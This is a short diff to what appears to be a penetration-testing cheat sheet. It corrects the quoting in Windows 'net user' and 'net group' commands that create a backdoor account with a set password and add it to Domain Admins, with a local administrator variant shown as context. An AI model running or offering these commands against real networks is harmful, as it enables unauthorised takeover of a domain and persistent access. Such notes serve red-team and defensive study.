@@ -113,6 +113,6 @@ Adding the user to the group - `net localgroup Administrators NewLAForMe /add`
 
 ### Add Domain Admin via CMD
 
-Creation of the user 'NewDAForMe' - `net user NewDAForMe 'NotThatStrongPassword@' /add /Y`
+Creation of the user 'NewDAForMe' - `net user NewDAForMe "NotThatStrongPassword@" /add /domain /Y`
 
-Adding the user to the group - `net group 'Domain Admins' NewDAForMe /add /domain`
+Adding the user to the group - `net group "Domain Admins" NewDAForMe /add /domain`
